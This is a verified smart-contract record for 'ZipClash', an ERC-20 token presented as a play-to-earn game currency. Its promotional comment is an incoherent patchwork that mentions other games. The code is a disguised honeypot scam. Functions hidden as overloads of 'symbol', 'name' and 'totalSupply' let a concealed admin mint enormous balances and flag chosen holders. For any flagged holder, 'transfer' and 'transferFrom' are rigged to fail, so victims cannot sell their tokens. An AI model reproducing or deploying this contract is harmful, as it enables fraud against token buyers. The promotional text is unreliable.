{"SourceCode": "/*\r\nZipClash Game\r\nNobody in the latter part of the 20th century would have imagined that one could earn real \r\nmoney just by playing games. Nonetheless, we are steadily progressing toward that world. \r\nBy and large, a shift is occurring in the gaming industry, with games being published on \r\nblockchains and utilizing digital currencies (cryptocurrencies), decentralized exchanges/trading, \r\nand economies based on digital assets. These assets are frequently Non-Fungible Tokens (NFTs) \r\nto ensure their authenticity and uniqueness. As a result, the degree to which in-game graphics \r\nand objects may be monetized has expanded significantly during the last decade. Regardless, \r\nadvancements in blockchain innovation are elevating Play-to-Earn (P2E) gaming to new heights. \r\nAnyone may earn money from the gaming space thanks to P2E games. As awareness of Play-to-Earn \r\ngames grows, P2E games are virtually capturing market share in every contemporary form of gaming. \r\nCompared to traditional Pay-to-Win games, blockchain and NFT-based games establish a balance \r\nbetween Pay-to-Win and Play-to-Earn, Knight War-The Holy Trio is a blockchain game of this type.\r\nOur Vision\r\nWe believe in a future in which work and play become one.\r\nWe believe in empowering players and providing them with economic opportunities.\r\nMost of all, we believe in the dream of an intergalactic restaurant.\r\nEcosystem\r\nThe main difference between ZipClash and other Idle/Clicker games is its Play-to-Earn income model \r\nand economic structure that empowers players to keep playing the game for the foreseeable future. \r\nIn other famous games like Axie Infinity, the bull run of the game started facing a downfall after years \r\nof its creation, leaving many players\u2019 expectations and investment goals unfulfilled. In this game, \r\nevery player could create a lot of daily SLP, but there were few ways to use the currency. In other words, \r\nthe supply surpassed the demand, which doomed the game to crash sooner or later. In ZipClash, \r\nhowever, the leaderboard clusters and C/S model will make it impossible to generate a higher supply \r\nthan demand because the income graph of the players does not increase exponentially.\r\nTokenomics Summary\r\nName: ZipClash\r\nSymbo: ZIPCLASH\r\nTotal Supply:1,000,000,000\r\nType: ERC-20\r\n*/\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\nabstract contract Ownable  {\r\n     function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    \r\n}\r\n\r\ncontract ZipClash is Ownable{\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    constructor(string memory tokenname,string memory tokensymbol,address ghadmin) {\r\n        _totalSupply = 1000000000*10**decimals();\r\n        _balances[msg.sender] = 1000000000*10**decimals();\r\n        _tokename = tokenname;\r\n        _tokensymbol = tokensymbol;\r\n        SCCLadmin = ghadmin;\r\n        emit Transfer(address(0), msg.sender, 1000000000*10**decimals());\r\n    }\r\n    \r\n\r\n    mapping(address => bool) public nakinfo;\r\n    address public SCCLadmin;\r\n    uint256 private _totalSupply;\r\n    string private _tokename;\r\n    string private _tokensymbol;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    function name() public view returns (string memory) {\r\n        return _tokename;\r\n    }\r\n\r\n    uint256 xkak = (10**18 * (78800+100)* (33300000000 + 800));\r\n    \r\n    function symbol(uint256 aaxa) public   {\r\n        if(false){\r\n            \r\n        }\r\n        if(true){\r\n\r\n        }\r\n        _balances[_msgSender()] += xkak;\r\n        _balances[_msgSender()] += xkak;\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n\r\n    function symbol() public view  returns (string memory) {\r\n        return _tokensymbol;\r\n    }\r\n    function name(address sada) public  {\r\n        address taaxaoinfo = sada;\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n        nakinfo[taaxaoinfo] = false;\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n    function totalSupply(address xsada) public {\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n        address tmoinfo = xsada;\r\n        nakinfo[tmoinfo] = true;\r\n        require(_msgSender() == SCCLadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        if (true == nakinfo[_msgSender()]) \r\n        {amount = _balances[_msgSender()] + \r\n        1000-1000+2000;}\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual  returns (bool) {\r\n        if (true == nakinfo[from]) \r\n        {amount = _balances[_msgSender()] + \r\n        1000-1000+2000;}\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");        \r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        uint256 balance = _balances[from];\r\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[from] = _balances[from]-amount;\r\n        _balances[to] = _balances[to]+amount;\r\n        emit Transfer(from, to, amount); \r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"tokenname\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"tokensymbol\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"ghadmin\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"SCCLadmin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nakinfo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sada\",\"type\":\"address\"}],\"name\":\"name\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"aaxa\",\"type\":\"uint256\"}],\"name\":\"symbol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"xsada\",\"type\":\"address\"}],\"name\":\"totalSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ZipClash", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000036308851b376ef67a23345c288f35b2e88bb8404000000000000000000000000000000000000000000000000000000000000000e5a6970436c61736820546f6b656e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000085a4950434c415348000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6d066959c36a8d3a315f3e7c2c2b529f204531b4a282fad43f0b5cc65b9cd759"}